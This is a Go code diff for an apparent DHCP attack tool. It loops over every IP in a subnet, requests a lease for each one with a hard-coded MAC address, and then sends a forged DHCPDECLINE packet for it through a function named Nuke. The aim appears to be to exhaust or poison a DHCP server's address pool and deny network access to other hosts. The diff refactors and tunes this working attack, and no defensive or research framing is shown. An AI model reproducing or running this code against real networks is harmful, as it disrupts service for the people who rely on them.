@@ -10,7 +10,7 @@ import (
 	"os"
 )
 
-const MAC = "08-00-27-00-A8-E8"
+const MAC = "9c:d2:1e:6c:65:b5"
 
 func main() {
 	if len(os.Args) == 1 {
@@ -24,11 +24,25 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+
+	m, err := net.ParseMAC(MAC)
+	if err != nil {
+		log.Printf("MAC Error:%v\n", err)
+	}
+	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4(192, 168, 1, 1), Port: 67}))
+	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c), dhcp4client.Broadcast(false))
+
+	defer func() {
+		if err != nil {
+			exampleClient.Close()
+		}
+	}()
 	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
 		log.Println(ip)
-		// ip := RequestIP()
-		//ip  = net.ParseIP(ip)
-		Nuke(ip)
+		ip := RequestIP(exampleClient)
+		ipv4 := net.ParseIP(ip)
+		//Nuke(ip)
+		Nuke(exampleClient, m, ipv4)
 	}
 }
 
@@ -41,35 +55,13 @@ func inc(ip net.IP) {
 	}
 }
 
-func Nuke(ip net.IP) {
+func Nuke(exampleClient *dhcp4client.Client, m net.HardwareAddr, ip net.IP) {
 	var err error
-
-	m, err := net.ParseMAC(MAC)
-	if err != nil {
-		log.Printf("MAC Error:%v\n", err)
-	}
-
-	//Create a connection to use
-	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4bcast, Port: 67}))
-	defer func() {
-		if err != nil {
-			c.Close()
-		}
-	}()
-
-	if err != nil {
-		log.Println("Client Conection Generation:" + err.Error())
-	}
-
-	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c))
-	if err != nil {
-		log.Fatalf("Error:%v\n", err)
-	}
 	_, err = SendDHCPDeclinePacket(exampleClient, m, ip)
 	if err != nil {
 		log.Fatalf("Couldn't send DeclinePacket:" + err.Error())
 	} else {
-		log.Println("Sent!!!")
+		log.Println("Sent nuke for " + ip.String())
 	}
 
 }
@@ -85,7 +77,7 @@ func DHCPDeclinePacket(hw net.HardwareAddr, ip net.IP) dhcp4.Packet {
 	packet.SetCIAddr(ip)
 
 	packet.SetXId(messageid)
-	packet.SetBroadcast(true)
+	packet.SetBroadcast(false)
 
 	packet.AddOption(dhcp4.OptionDHCPMessageType, []byte{byte(dhcp4.Decline)})
 	return packet
@@ -98,38 +90,19 @@ func SendDHCPDeclinePacket(c *dhcp4client.Client, hw net.HardwareAddr, ip net.IP
 	return DeclinePacket, c.SendPacket(DeclinePacket)
 }
 
-func RequestIP() string {
+func RequestIP(exampleClient *dhcp4client.Client) string {
 
-	var err error
+	// discoveryPacket, _ := exampleClient.SendDiscoverPacket()
+	// log.Println("Packet:%v\n", discoveryPacket)
 
-	m, err := net.ParseMAC(MAC)
-	if err != nil {
-		log.Printf("MAC Error:%v\n", err)
-	}
-
-	//Create a connection to use
-	//We need to set the connection ports to 1068 and 1067 so we don't need root access
-	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4bcast, Port: 67}))
-	defer func() {
-		if err != nil {
-			c.Close()
-		}
-	}()
-
-	if err != nil {
-		log.Fatalln("Client Conection Generation:" + err.Error())
-	}
-
-	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c))
-	if err != nil {
-		log.Fatalf("Error:%v\n", err)
-	}
+	// offerPacket, _ := exampleClient.GetOffer(&discoveryPacket)
+	// log.Println("Packet:%v\n", offerPacket)
+	// log.Println("OFFERED:" + offerPacket.YIAddr().String())
+	//return offerPacket.YIAddr().String()
+	//requestPacket, _ := exampleClient.SendRequest(&offerPacket)
+	//log.Println("Packet:%v\n", requestPacket)
 
 	success, acknowledgementpacket, err := exampleClient.Request()
-
-	log.Println("Success:%v\n", success)
-	log.Println("Packet:%v\n", acknowledgementpacket)
-
 	if err != nil {
 		networkError, ok := err.(*net.OpError)
 		if ok && networkError.Timeout() {
@@ -137,12 +110,14 @@ func RequestIP() string {
 		}
 		log.Println("Error:%v\n", err)
 	}
+	log.Println("Success:%v\n", success)
+	log.Println("Packet:%v\n", acknowledgementpacket)
+	return acknowledgementpacket.YIAddr().String()
 
-	if !success {
-		log.Fatalln("We didn't sucessfully get a DHCP Lease?")
-	} else {
-		log.Printf("IP Received:%v\n", acknowledgementpacket.YIAddr().String())
-		return acknowledgementpacket.YIAddr().String()
-	}
-	return ""
+	// if !success {
+	// 	log.Fatalln("We didn't sucessfully get a DHCP Lease?")
+	// } else {
+	// 	log.Printf("IP Received:%v\n", acknowledgementpacket.YIAddr().String())
+	// 	return acknowledgementpacket.YIAddr().String()
+	// }
 }
